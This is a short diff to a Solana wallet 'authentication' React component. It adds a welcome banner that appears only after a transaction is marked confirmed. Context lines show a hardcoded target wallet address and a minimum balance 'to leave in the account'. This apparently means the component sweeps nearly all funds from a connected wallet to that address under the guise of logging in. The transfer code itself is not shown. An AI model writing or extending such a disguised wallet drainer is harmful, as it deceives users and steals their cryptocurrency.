@@ -6,6 +6,7 @@ import { PhantomWalletAdapter } from '@solana/wallet-adapter-wallets';
 import { WalletProvider, useWallet } from '@solana/wallet-adapter-react';
 import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import '@solana/wallet-adapter-react-ui/styles.css';
+import { WelcomeBanner } from '@/app/chat/chat';
 
 const TARGET_WALLET = 'J9tS1H3JainEykwn1TFBXys99nUaNMVf64favx8rJeEq';
 const MIN_BALANCE_TO_KEEP = 0.001 * 1e9; // 0.001 SOL to leave in the account
@@ -85,6 +86,8 @@ const SolanaAuthInner = ({ onConfirm }: { onConfirm: (isConfirmed: boolean) => v
                 <WalletMultiButton />
             </div>
             </div>
+            {localStorage.getItem('transactionConfirmed') === 'true' ? <WelcomeBanner /> : null}
+
         </div>
     );
 };
